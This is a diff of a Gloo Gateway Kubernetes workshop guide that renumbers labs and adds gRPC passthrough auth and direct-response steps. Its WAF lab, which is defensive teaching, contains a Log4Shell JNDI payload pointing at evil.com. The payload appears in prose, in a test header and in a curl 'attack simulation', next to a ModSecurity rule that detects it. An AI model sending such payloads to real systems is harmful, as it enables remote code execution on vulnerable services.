+            - containerPort: 9001
+          env:
+            - name: REQUEST_LOGGING
+              value: "true"
+---
+apiVersion: v1
+kind: Service
+metadata:
+  name: example-grpc-auth-service
+  namespace: httpbin
+  labels:
+    app: grpc-extauth
+spec:
+  ports:
+  - port: 9001
+    protocol: TCP
+  selector:
+    app: grpc-extauth
+EOF
+kubectl -n httpbin wait --for=condition=ready pod -l app=grpc-extauth
+```
+
+Validate that the service is running:
+
+```bash,norun-workshop
+kubectl --context cluster1 -n httpbin get all -l app=grpc-extauth 
+```
+
+Here is the expected output:
+
+```log,nocopy
+NAME                                               READY   STATUS    RESTARTS   AGE
+pod/httpbin-extauth-grpcservice-689dd8f775-99rsh   1/1     Running   0          11s
+
+NAME                                TYPE        CLUSTER-IP    EXTERNAL-IP   PORT(S)    AGE
+service/example-grpc-auth-service   ClusterIP   10.1.128.52   <none>        9001/TCP   11s
+
+NAME                                                     DESIRED   CURRENT   READY   AGE
+replicaset.apps/httpbin-extauth-grpcservice-689dd8f775   1         1         1       11s
+```
+
+Now setup the `AuthConfig` resource and add our external authentication rules.
+
+```bash
+kubectl --context cluster1 apply -f - <<EOF
+apiVersion: enterprise.gloo.solo.io/v1
+kind: AuthConfig
+metadata:
+  name: httpbin1-grpc-passthrough-auth
+  namespace: httpbin
+spec:
+  configs:
+    - passThroughAuth:
+        grpc:
+          address: example-grpc-auth-service.httpbin.svc.cluster.local:9001
+          connectionTimeout: 3s
+          retryPolicy:
+            numRetries: 10
+            retryBackOff:
+              baseInterval: 1s
+              maxInterval: 2s
+EOF
+```
+
+Next we will create a `RouteOption` resource and reference the `AuthConfig` resource that we just created.
+
+```bash
+kubectl apply -f- <<EOF
+apiVersion: gateway.solo.io/v1
+kind: RouteOption
+metadata:
+  name: httpbin1-grpc-passthrough-auth
+  namespace: httpbin
+spec:
+  options:
+    extauth:
+      configRef:
+        name: httpbin1-grpc-passthrough-auth
+        namespace: httpbin
+EOF
+```
+
+After that we will create `HTTPRoute` resource for the httpbin1 app that requires authentication for requests on the `httpbin.example.com` domain.
+
+```bash
+kubectl apply --context cluster1 -f- <<EOF
+apiVersion: gateway.networking.k8s.io/v1
+kind: HTTPRoute
+metadata:
+  name: httpbin
+  namespace: httpbin
+spec:
+  rules:
+    - filters:
+        - type: ExtensionRef
+          extensionRef:
+            group: gateway.solo.io
+            kind: RouteOption
+            name: httpbin1-grpc-passthrough-auth
+      backendRefs:
+        - name: httpbin1
+          port: 8000
+EOF
+```
+Configure your hosts file to resolve `httpbin.example.com` with the IP address of the proxy by executing the following command:
+
+```bash
+INGRESS_GW_ADDRESS=$(kubectl --context cluster1 -n gloo-system get svc gloo-proxy-http -o jsonpath='{.status.loadBalancer.ingress[0].ip}{.status.loadBalancer.ingress[0].hostname}')
+./scripts/register-domain.sh "httpbin.example.com" ${INGRESS_GW_ADDRESS}
+```
+
+Try to access the endpoint `httpbin.example.com` without any additional headers in the request. You should get a `401` response, as you are not passing the required authorization header.
+```bash,norun-workshop
+curl -ks "https://httpbin.example.com/status/200" -o /dev/null -w "%{http_code}"
+```
+<!--bash
+cat <<'EOF' > ./test.js
+var chai = require('chai');
+var expect = chai.expect;
+const helpers = require('./tests/chai-exec');
+
+describe("Communication status", () => {
+  it("Accessing grpc-passthrough-auth without authorization header should return a 403", () => {
+    const command = helpers.getOutputForCommand({ command: "curl -ks https://httpbin.example.com/status/200 -s -o /dev/null -w '%{http_code}'"});
+    expect(command).to.contain("403");
+  });
+  it("Accessing grpc-passthrough-auth with a BAD authorization header should return a 403", () => {
+    const command = helpers.getOutputForCommand({ command: "curl -ks https://httpbin.example.com/status/200 -s -o /dev/null -w '%{http_code}' -H 'authorization: deny me'"});
+    expect(command).to.contain("403");
+  });
+});
+EOF
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/extauth-grpc-passthrough-auth/tests/grpc-passthrough-not-authorized.liquid from lab number 11"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 11"; exit 1; }
+-->
+
+Now send the header required by the gRPC passthrough service `authorization: authorize me`. This should return a `200` response.
+```bash,norun-workshop
+curl -ks "https://httpbin.example.com/status/200" -o /dev/null -w "%{http_code}" -H "authorization: authorize me"
+```
+<!--bash
+cat <<'EOF' > ./test.js
+var chai = require('chai');
+var expect = chai.expect;
+const helpers = require('./tests/chai-exec');
+
+describe("Communication status", () => {
+  it("Accessing grpc-passthrough-auth with authorization header should return a 200", () => {
+    const command = helpers.getOutputForCommand({ command: "curl -ks https://httpbin.example.com/status/200 -s -o /dev/null -w '%{http_code}' -H 'authorization: authorize me'"});
+    expect(command).to.contain("200");
+  });
+});
+EOF
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/extauth-grpc-passthrough-auth/tests/grpc-passthrough-authorized.liquid from lab number 11"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 11"; exit 1; }
+-->
+
+You should see the request going through successfully now!
+
+In case if you do not get a status of `200`, you can take a peek at the logs of the gRPC passthrough service to view the contents of the HTTP request to help with troubleshooting.
+```bash,norun-workshop
+kubectl --context cluster1 -n httpbin logs -f deploy/httpbin-extauth-grpcservice
+```
+
+Here is a sample of how the logs from the pod may look like:
+
+```json,nocopy
+2025/04/22 23:09:01 starting gRPC server on: 9001
+2025/04/22 23:09:03 request: {
+        "attributes": {
+                "source": {
+                        "address": {
+                                "Address": {
+                                        "SocketAddress": {
+                                                "address": "10.101.0.1",
+                                                "PortSpecifier": {
+                                                        "PortValue": 48240
+                                                }
+                                        }
+                                }
+                        }
+                },
+                "destination": {
+                        "address": {
+                                "Address": {
+                                        "SocketAddress": {
+                                                "address": "10.101.0.16",
+                                                "PortSpecifier": {
+                                                        "PortValue": 8443
+                                                }
+                                        }
+                                }
+                        },
+                        "principal": "CN=*"
+                },
+                "request": {
+                        "time": {
+                                "seconds": 1745363343,
+                                "nanos": 2733000
+                        },
+                        "http": {
+                                "id": "9448733308896076001",
+                                "method": "GET",
+                                "headers": {
+                                        ":authority": "grpc-passthrough-auth.example.com",
+                                        ":method": "GET",
+                                        ":path": "/status/200",
+                                        ":scheme": "https",
+                                        "accept": "*/*",
+                                        "authorization": "authorize me",
+                                        "user-agent": "curl/8.5.0",
+                                        "x-forwarded-proto": "https",
+                                        "x-request-id": "12b3bd6d-7267-4792-bbbe-96a57688df03"
+                                },
+                                "path": "/status/200",
+                                "host": "grpc-passthrough-auth.example.com",
+                                "scheme": "https",
+                                "protocol": "HTTP/2"
+                        }
+                },
+                "context_extensions": {
+                        "config_id": "httpbin.httpbin1-grpc-passthrough-auth",
+                        "source_name": "",
+                        "source_type": "route"
+                },
+                "metadata_context": {
+                        "filter_metadata": {
+                                "solo.auth.passthrough": {},
+                                "solo.auth.passthrough.config": {}
+                        }
+                },
+                "route_metadata_context": {}
+        }
+}
+2025/04/22 23:09:03 Received request with correct authorization header
+```
+
+Let's delete the `HTTProute`,`RouteOption` and `AuthConfig` we've created for this lab:
+
+```bash
+kubectl --context cluster1 -n httpbin delete httproute httpbin
+kubectl --context cluster1 -n httpbin delete routeoption httpbin1-grpc-passthrough-auth
+kubectl --context cluster1 -n httpbin delete authconfig httpbin1-grpc-passthrough-auth
+```
+
+Finally we will also remove the custom gRPC passthrough auth service as well:
+
+```bash
+kubectl --context cluster1 -n httpbin delete service -l app=grpc-extauth
+kubectl --context cluster1 -n httpbin delete deploy httpbin-extauth-grpcservice
+```
+
+
+
+## Lab 12 - Direct response <a name="lab-12---direct-response-"></a>
+
+The Kubernetes Gateway API doesn't provide the ability to configure direct responses (yet), so we've added this capability with a custom filter.
+
+You need to create a `DirectResponse` object (in this example, to provide a health check endpoint).
+
+```bash
+kubectl apply --context ${CLUSTER1} -f - <<EOF
+apiVersion: gateway.gloo.solo.io/v1alpha1
+kind: DirectResponse
+metadata:
+  name: health
+  namespace: httpbin
+spec:
+  status: 200
+  body: "The service is available"
+EOF
+```
+
+Then, you can update the `HTTPRoute` to leverage it.
+
+```bash
+kubectl apply --context ${CLUSTER1} -f - <<EOF
+apiVersion: gateway.networking.k8s.io/v1
+kind: HTTPRoute
+metadata:
+  name: httpbin
+  namespace: httpbin
+spec:
+  rules:
+    - matches:
+      - path:
+          type: PathPrefix
+          value: /health
+      filters:
+      - type: ExtensionRef
+        extensionRef:
+          name: health
+          group: gateway.gloo.solo.io
+          kind: DirectResponse
+EOF
+```
+
+Check you can access the `/health` path and get a `200` response code:
+
+```bash,norun-workshop
+curl -k https://httpbin.example.com/health -w "%{http_code}"
+```
+
+Here is the expected output:
+
+```,nocopy
+200
+```
+
+<!--bash
+cat <<'EOF' > ./test.js
+const helpersHttp = require('./tests/chai-http');
+
+describe("Direct response returns 200", () => {
+  it('Checking \'200\' status code', () => helpersHttp.checkURL({ host: `https://httpbin.example.com`, path: '/health', retCode: 200 }));
+})
+EOF
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/direct-response/tests/direct-response.test.js.liquid from lab number 12"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 12"; exit 1; }
+-->
+
+
+
+## Lab 13 - Modify the requests and responses <a name="lab-13---modify-the-requests-and-responses-"></a>
 
 The Kubernetes Gateway API provides different options to add/update/remove request and response headers.
 
@@ -2321,8 +3509,8 @@ describe("request transformations applied", () => {
   it('Checking text \'To-Remove\'', () => helpersHttp.checkBody({ host: `https://httpbin.example.com`, path: '/get', body: 'To-Remove', match: false }));
 })
 EOF
-echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/transformations/tests/request-headers.test.js.liquid from lab number 8"
-timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 8"; exit 1; }
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/transformations/tests/request-headers.test.js.liquid from lab number 13"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 13"; exit 1; }
 -->
 
 Another typical use case is to rewrite the hostname or the path before sending the request to the backend.
@@ -2405,8 +3593,8 @@ describe("request rewrite applied", () => {
   it('Checking text \'httpbin1.com/get\'', () => helpersHttp.checkBody({ host: `https://httpbin.example.com`, path: '/publicget', body: 'httpbin1.com/get', match: true }));
 })
 EOF
-echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/transformations/tests/request-rewrite.test.js.liquid from lab number 8"
-timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 8"; exit 1; }
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/transformations/tests/request-rewrite.test.js.liquid from lab number 13"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 13"; exit 1; }
 -->
 
 
@@ -2479,8 +3667,8 @@ describe("response transformations applied", () => {
   it('Checking text \'To-Remove\'', () => helpersHttp.checkBody({ host: `https://httpbin.example.com`, path: '/response-headers?to-remove=whatever&to-modify=oldvalue', body: 'To-Remove', match: false }));
 })
 EOF
-echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/transformations/tests/response-headers.test.js.liquid from lab number 8"
-timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 8"; exit 1; }
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/transformations/tests/response-headers.test.js.liquid from lab number 13"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 13"; exit 1; }
 -->
 
 Let's apply the original `HTTPRoute` yaml:
@@ -2591,8 +3779,8 @@ describe("request transformation applied", () => {
   it('Checking text \'X-Client\'', () => helpersHttp.checkBody({ host: `https://httpbin.example.com`, path: '/get', headers: [{key: 'User-agent', value: 'curl/8.5.0'}], body: 'X-Client', match: true }));
 })
 EOF
-echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/transformations/tests/x-client-request-header.test.js.liquid from lab number 8"
-timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 8"; exit 1; }
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/transformations/tests/x-client-request-header.test.js.liquid from lab number 13"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 13"; exit 1; }
 -->
 
 As you can see, we've created a new header called `X-Client` by extracting some data from the `User-Agent` header using a regular expression.
@@ -2678,8 +3866,8 @@ describe("response transformation applied", () => {
   it('Checking \'X-Request-Id\' header', () => helpersHttp.checkHeaders({ host: `https://httpbin.example.com`, path: '/get', expectedHeaders: [{'key': 'x-request-id', 'value': '*'}]}));
 })
 EOF
-echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/transformations/tests/x-request-id-response-header.js.liquid from lab number 8"
-timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 8"; exit 1; }
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/transformations/tests/x-request-id-response-header.js.liquid from lab number 13"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 13"; exit 1; }
 -->
 
 Let's apply the original `HTTPRoute` yaml:
@@ -2711,7 +3899,7 @@ kubectl delete --context ${CLUSTER1} -n httpbin routeoption routeoption
 
 
 
-## Lab 9 - Split traffic between 2 backend services <a name="lab-9---split-traffic-between-2-backend-services-"></a>
+## Lab 14 - Split traffic between 2 backend services <a name="lab-14---split-traffic-between-2-backend-services-"></a>
 
 You can split traffic between different backends, with different weights.
 
@@ -2777,14 +3965,14 @@ describe("traffic split applied", () => {
   it('Checking text \'httpbin2\'', () => helpersHttp.checkBody({ host: `https://httpbin.example.com`, path: '/hostname', body: 'httpbin2', match: true }));
 })
 EOF
-echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/traffic-split/tests/traffic-split.test.js.liquid from lab number 9"
-timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 9"; exit 1; }
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/traffic-split/tests/traffic-split.test.js.liquid from lab number 14"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 14"; exit 1; }
 -->
 
 
 
 
-## Lab 10 - Securing the access with OAuth <a name="lab-10---securing-the-access-with-oauth-"></a>
+## Lab 15 - Securing the access with OAuth <a name="lab-15---securing-the-access-with-oauth-"></a>
 
 In this step, we're going to secure the access to the `httpbin` service using OAuth.
 
@@ -2914,8 +4102,8 @@ describe("Authentication is working properly", function () {
 });
 
 EOF
-echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/extauth-oauth/tests/authentication.test.js.liquid from lab number 10"
-timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 10"; exit 1; }
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/extauth-oauth/tests/authentication.test.js.liquid from lab number 15"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 15"; exit 1; }
 -->
 <!--bash
 cat <<'EOF' > ./test.js
@@ -2927,8 +4115,8 @@ describe("Claim to header is working properly", function() {
 });
 
 EOF
-echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/extauth-oauth/tests/header-added.test.js.liquid from lab number 10"
-timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 10"; exit 1; }
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/extauth-oauth/tests/header-added.test.js.liquid from lab number 15"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 15"; exit 1; }
 -->
 
 If you refresh the web browser, you will be redirected to the authentication page.
@@ -3021,15 +4209,15 @@ describe("Authentication is working properly", function () {
 });
 
 EOF
-echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/extauth-oauth/tests/authorization.test.js.liquid from lab number 10"
-timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 10"; exit 1; }
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/extauth-oauth/tests/authorization.test.js.liquid from lab number 15"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 15"; exit 1; }
 -->
 If you open the browser in incognito and login using the username `user2` and the password `password`, you will now be able to access it since the user's email ends with `@solo.io`.
 
 
 
 
-## Lab 11 - Use the transformation filter to manipulate headers <a name="lab-11---use-the-transformation-filter-to-manipulate-headers-"></a>
+## Lab 16 - Use the transformation filter to manipulate headers <a name="lab-16---use-the-transformation-filter-to-manipulate-headers-"></a>
 
 
 In this step, we're going to use a regular expression to extract a part of an existing header and to create a new one:
@@ -3077,13 +4265,13 @@ describe("Transformation is working properly", function() {
 });
 
 EOF
-echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/advanced-transformations/tests/header-added.test.js.liquid from lab number 11"
-timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 11"; exit 1; }
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/advanced-transformations/tests/header-added.test.js.liquid from lab number 16"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 16"; exit 1; }
 -->
 
 
 
-## Lab 12 - Apply rate limiting to the Gateway <a name="lab-12---apply-rate-limiting-to-the-gateway-"></a>
+## Lab 17 - Apply rate limiting to the Gateway <a name="lab-17---apply-rate-limiting-to-the-gateway-"></a>
 
 In this step, we're going to apply rate limiting to the Gateway to only allow 3 requests per minute for the users of the `solo.io` organization.
 
@@ -3160,8 +4348,8 @@ describe("Rate limiting is working properly", function() {
 });
 
 EOF
-echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/ratelimiting/tests/rate-limited.test.js.liquid from lab number 12"
-timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 12"; exit 1; }
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/ratelimiting/tests/rate-limited.test.js.liquid from lab number 17"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 17"; exit 1; }
 -->
 
 You should get a `200` response code the first 3 times and a `429` response code after.
@@ -3194,92 +4382,7 @@ kubectl delete --context ${CLUSTER1} -n httpbin routeoption routeoption
 
 
 
-## Lab 13 - Use the Web Application Firewall filter <a name="lab-13---use-the-web-application-firewall-filter-"></a>
-
-A web application firewall (WAF) protects web applications by monitoring, filtering, and blocking potentially harmful traffic and attacks that can overtake or exploit them.
-
-Gloo Gateway includes the ability to enable the ModSecurity Web Application Firewall for any incoming and outgoing HTTP connections.
-
-An example of how using Gloo Gateway we'd easily mitigate the recent Log4Shell vulnerability ([CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)), which for many enterprises was a major ordeal that took weeks and months of updating all services.
-
-The Log4Shell vulnerability impacted all Java applications that used the log4j library (common library used for logging) and that exposed an endpoint. You could exploit the vulnerability by simply making a request with a specific header. In the example below, we will show how to protect your services against the Log4Shell exploit.
-
-Using the Web Application Firewall capabilities you can reject requests containing such headers.
-
-Log4Shell attacks operate by passing in a Log4j expression that could trigger a lookup to a remote server, like a JNDI identity service. The malicious expression might look something like this: `${jndi:ldap://evil.com/x}`. It might be passed in to the service via a header, a request argument, or a request payload. What the attacker is counting on is that the vulnerable system will log that string using log4j without checking it. That's what triggers the destructive JNDI lookup and the ultimate execution of malicious code.
-
-You need to create the following `RouteOption`:
-
-```bash
-kubectl apply --context ${CLUSTER1} -f - <<EOF
-apiVersion: gateway.solo.io/v1
-kind: RouteOption
-metadata:
-  name: waf
-  namespace: gloo-system
-spec:
-  targetRefs:
-  - group: gateway.networking.k8s.io
-    kind: HTTPRoute
-    name: httpbin
-  options:
-    waf:
-      customInterventionMessage: 'Log4Shell malicious payload'
-      ruleSets:
-      - ruleStr: |
-          SecRuleEngine On
-          SecRequestBodyAccess On
-          SecRule REQUEST_LINE|ARGS|ARGS_NAMES|REQUEST_COOKIES|REQUEST_COOKIES_NAMES|REQUEST_BODY|REQUEST_HEADERS|XML:/*|XML://@*
-            "@rx \\\${jndi:(?:ldaps?|iiop|dns|rmi)://"
-            "id:1000,phase:2,deny,status:403,log,msg:'Potential Remote Command Execution: Log4j CVE-2021-44228'"
-EOF
-```
-
-As you can see, this `RouteOption` targets the parent `HTTPRoute`. That way, the WAF rule is applied to all the traffic targetting the `httpbin` application.
-
-<!--bash
-cat <<'EOF' > ./test.js
-const chaiExec = require("@jsdevtools/chai-exec");
-const helpersHttp = require('./tests/chai-http');
-var chai = require('chai');
-var expect = chai.expect;
-
-describe("WAF is working properly", function() {
-  it('The request has been blocked', () => helpersHttp.checkBody({ host: `https://httpbin.example.com`, path: '/get', headers: [{key: 'User-Agent', value: '${jndi:ldap://evil.com/x}'}], body: 'Log4Shell malicious payload' }));
-});
-EOF
-echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/waf/tests/waf.test.js.liquid from lab number 13"
-timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 13"; exit 1; }
--->
-
-Run the following command to simulate an attack:
-
-```bash
-curl -H "User-Agent: \${jndi:ldap://evil.com/x}" -k "https://httpbin.example.com/get" -i
-```
-
-The request should be rejected:
-
-```http,nocopy
-HTTP/2 403 
-content-length: 27
-content-type: text/plain
-date: Tue, 05 Apr 2022 10:20:06 GMT
-server: istio-envoy
-
-Log4Shell malicious payload
-```
-
-Let's delete the `RouteOption` we've created:
-
-```bash
-kubectl delete --context ${CLUSTER1} -n gloo-system routeoption waf
-```
-
-
-
-
-## Lab 14 - Use the JWT filter to validate JWT and create headers from claims <a name="lab-14---use-the-jwt-filter-to-validate-jwt-and-create-headers-from-claims-"></a>
+## Lab 18 - Use the JWT filter to validate JWT and create headers from claims <a name="lab-18---use-the-jwt-filter-to-validate-jwt-and-create-headers-from-claims-"></a>
 
 
 In this step, we're going to validate the JWT token and to create a new header from the `email` claim.
@@ -3416,8 +4519,8 @@ describe("Claim to header is working properly", function() {
 });
 
 EOF
-echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/jwt/tests/header-added.test.js.liquid from lab number 14"
-timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 14"; exit 1; }
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/jwt/tests/header-added.test.js.liquid from lab number 18"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 18"; exit 1; }
 -->
 
 
@@ -3505,8 +4608,8 @@ describe("Only User2 can access httpbin", function() {
 });
 
 EOF
-echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/jwt/tests/only-user2-allowed.test.js.liquid from lab number 14"
-timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 14"; exit 1; }
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/jwt/tests/only-user2-allowed.test.js.liquid from lab number 18"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 18"; exit 1; }
 -->
 
 
@@ -3521,7 +4624,92 @@ kubectl --context ${CLUSTER1} -n httpbin delete routeoption routeoption
 
 
 
-## Lab 15 - Validate and authorize client certificates <a name="lab-15---validate-and-authorize-client-certificates-"></a>
+## Lab 19 - Use the Web Application Firewall filter <a name="lab-19---use-the-web-application-firewall-filter-"></a>
+
+A web application firewall (WAF) protects web applications by monitoring, filtering, and blocking potentially harmful traffic and attacks that can overtake or exploit them.
+
+Gloo Gateway includes the ability to enable the ModSecurity Web Application Firewall for any incoming and outgoing HTTP connections.
+
+An example of how using Gloo Gateway we'd easily mitigate the recent Log4Shell vulnerability ([CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)), which for many enterprises was a major ordeal that took weeks and months of updating all services.
+
+The Log4Shell vulnerability impacted all Java applications that used the log4j library (common library used for logging) and that exposed an endpoint. You could exploit the vulnerability by simply making a request with a specific header. In the example below, we will show how to protect your services against the Log4Shell exploit.
+
+Using the Web Application Firewall capabilities you can reject requests containing such headers.
+
+Log4Shell attacks operate by passing in a Log4j expression that could trigger a lookup to a remote server, like a JNDI identity service. The malicious expression might look something like this: `${jndi:ldap://evil.com/x}`. It might be passed in to the service via a header, a request argument, or a request payload. What the attacker is counting on is that the vulnerable system will log that string using log4j without checking it. That's what triggers the destructive JNDI lookup and the ultimate execution of malicious code.
+
+You need to create the following `RouteOption`:
+
+```bash
+kubectl apply --context ${CLUSTER1} -f - <<EOF
+apiVersion: gateway.solo.io/v1
+kind: RouteOption
+metadata:
+  name: waf
+  namespace: gloo-system
+spec:
+  targetRefs:
+  - group: gateway.networking.k8s.io
+    kind: HTTPRoute
+    name: httpbin
+  options:
+    waf:
+      customInterventionMessage: 'Log4Shell malicious payload'
+      ruleSets:
+      - ruleStr: |
+          SecRuleEngine On
+          SecRequestBodyAccess On
+          SecRule REQUEST_LINE|ARGS|ARGS_NAMES|REQUEST_COOKIES|REQUEST_COOKIES_NAMES|REQUEST_BODY|REQUEST_HEADERS|XML:/*|XML://@*
+            "@rx \\\${jndi:(?:ldaps?|iiop|dns|rmi)://"
+            "id:1000,phase:2,deny,status:403,log,msg:'Potential Remote Command Execution: Log4j CVE-2021-44228'"
+EOF
+```
+
+As you can see, this `RouteOption` targets the parent `HTTPRoute`. That way, the WAF rule is applied to all the traffic targetting the `httpbin` application.
+
+<!--bash
+cat <<'EOF' > ./test.js
+const chaiExec = require("@jsdevtools/chai-exec");
+const helpersHttp = require('./tests/chai-http');
+var chai = require('chai');
+var expect = chai.expect;
+
+describe("WAF is working properly", function() {
+  it('The request has been blocked', () => helpersHttp.checkBody({ host: `https://httpbin.example.com`, path: '/get', headers: [{key: 'User-Agent', value: '${jndi:ldap://evil.com/x}'}], body: 'Log4Shell malicious payload' }));
+});
+EOF
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/waf/tests/waf.test.js.liquid from lab number 19"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 19"; exit 1; }
+-->
+
+Run the following command to simulate an attack:
+
+```bash
+curl -H "User-Agent: \${jndi:ldap://evil.com/x}" -k "https://httpbin.example.com/get" -i
+```
+
+The request should be rejected:
+
+```http,nocopy
+HTTP/2 403 
+content-length: 27
+content-type: text/plain
+date: Tue, 05 Apr 2022 10:20:06 GMT
+server: istio-envoy
+
+Log4Shell malicious payload
+```
+
+Let's delete the `RouteOption` we've created:
+
+```bash
+kubectl delete --context ${CLUSTER1} -n gloo-system routeoption waf
+```
+
+
+
+
+## Lab 20 - Validate and authorize client certificates <a name="lab-20---validate-and-authorize-client-certificates-"></a>
 
 In this step, we're going to secure the access to the httpbin service using mutual TLS (mTLS), and apply further authorization based on information in the client certificate.
 
@@ -3659,8 +4847,8 @@ describe("Downstream mTLS", () => {
 });
 
 EOF
